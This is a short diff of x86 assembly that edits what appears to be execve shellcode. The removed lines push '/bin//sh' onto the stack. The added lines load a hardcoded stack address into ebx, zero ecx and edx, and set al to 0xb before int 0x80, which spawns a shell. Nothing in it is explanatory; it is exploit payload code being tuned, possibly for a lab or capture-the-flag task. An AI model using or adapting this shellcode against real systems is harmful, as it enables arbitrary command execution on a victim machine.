@@ -11,20 +11,11 @@ add    esi, 12
 jmp    esi
 add    edx, 12
 jmp    edx
-xor    eax, eax
-push   eax
+mov    ebx, 0xffffd574
 jmp    esi
-push   0x68732f2f
-jmp    esi
-push   0x6e69622f
-jmp    esi
-mov    esp, ebx
-push   eax
-push   ebx
-jmp    esi
-mov    esp, ecx
+xor    ecx, ecx
+xor    edx, edx
 mov    al, 0xb
-jmp    esi
 int    0x80
 ret
 leave
